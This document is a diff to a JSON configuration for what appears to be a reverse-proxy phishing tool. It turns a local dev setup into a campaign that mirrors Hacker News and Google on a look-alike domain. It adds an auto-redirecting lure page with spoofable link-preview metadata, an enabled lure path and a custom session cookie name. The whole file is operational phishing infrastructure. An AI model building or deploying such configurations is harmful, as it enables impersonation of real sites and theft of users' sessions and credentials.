@@ -1,10 +1,10 @@
 {
   "campaign": {
-    "campaignId": "ssedev",
-    "mirrorDomain": "ssedev.fake",
-    "description": "SSEDev local mirror",
-    "landingUpgradePath": "/fake-auth",
-    "sessionCookieName": "fake-sess",
+    "campaignId": "hackernews",
+    "mirrorDomain": "fake-mirrors.net",
+    "description": "HackerNews mirror",
+    "landingUpgradePath": "/rohta/aqueish",
+    "sessionCookieName": "raegaefo",
     "sessionExpire": 86400000,
     "newSessionExpire": 300000,
     "messageExpire": 3600000
@@ -19,30 +19,67 @@
   "targets": [
     {
       "targetId": "root",
-      "isLanding": false,
+      "isLanding": true,
       "donorSecure": true,
-      "donorSub": ".",
-      "donorDomain": "sse.dev",
+      "donorSub": "news",
+      "donorDomain": "ycombinator.com",
       "donorPort": 443,
-      "mirrorSecure": false,
-      "mirrorSub": ".",
-      "mirrorPort": 3080,
+      "mirrorSecure": true,
+      "mirrorSub": "hackernews",
+      "mirrorPort": 443,
       "labels": [
-        "ssedev"
+        "hackernews"
       ],
       "connectTimeout": 2000,
       "simpleTimeout": 10000,
       "streamTimeout": 60000,
       "headersSizeLimit": 10240,
       "bodySizeLimit": 10485760,
-      "mainPage": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>ssedev</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <h1>Server-Sent-Events Playground Tool</h1>\n  </body>\n</html>\n",
+      "mainPage": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>hackernews</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <h1>Hacker News</h1>\n  </body>\n</html>\n",
       "notFoundPage": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Not found</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <h1>Not found</h1>\n  </body>\n</html>\n",
       "faviconIco": "AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n",
       "robotsTxt": "User-agent: *\nDisallow: /\n",
       "sitemapXml": "",
       "isEnabled": true
+    },
+    {
+      "targetId": "google-www",
+      "isLanding": true,
+      "donorSecure": true,
+      "donorSub": "www",
+      "donorDomain": "google.com",
+      "donorPort": 443,
+      "mirrorSecure": true,
+      "mirrorSub": "hackernews-itc",
+      "mirrorPort": 443,
+      "labels": [
+        "google"
+      ],
+      "connectTimeout": 2000,
+      "simpleTimeout": 10000,
+      "streamTimeout": 60000,
+      "headersSizeLimit": 10240,
+      "bodySizeLimit": 10485760,
+      "mainPage": "",
+      "notFoundPage": "",
+      "faviconIco": "",
+      "robotsTxt": "",
+      "sitemapXml": "",
+      "isEnabled": true
     }
   ],
-  "redirectors": [],
-  "lures": []
+  "redirectors": [
+    {
+      "redirectorId": "simple",
+      "page": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<% if (data.og_title) { %>\n    <meta property=\"og:title\" content=\"<%= data.og_title %>\">\n<% } %>\n<% if (data.og_desc) { %>\n    <meta property=\"og:description\" content=\"<%= data.og_desc %>\">\n<% } %>\n<% if (data.og_image) { %>\n    <meta property=\"og:image\" content=\"<%= data.og_image %>\">\n<% } %>\n<% if (data.og_url) { %>\n    <meta property=\"og:url\" content=\"<%= data.og_url %>\">\n<% } %>\n    <title>You will be redirected...</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <p>You will be redirected...</p>\n    <script>\n<% if (data.upgrade_url) { %>\n      setTimeout(() => {\n        window.location.assign(\"<%= data.upgrade_url %>\");\n      }, 1000);\n<% } %>\n    </script>\n  </body>\n</html>\n"
+    }
+  ],
+  "lures": [
+    {
+      "lureId": "test",
+      "path": "/foo-bar-baz",
+      "redirectorId": "simple",
+      "isEnabled": true
+    }
+  ]
 }
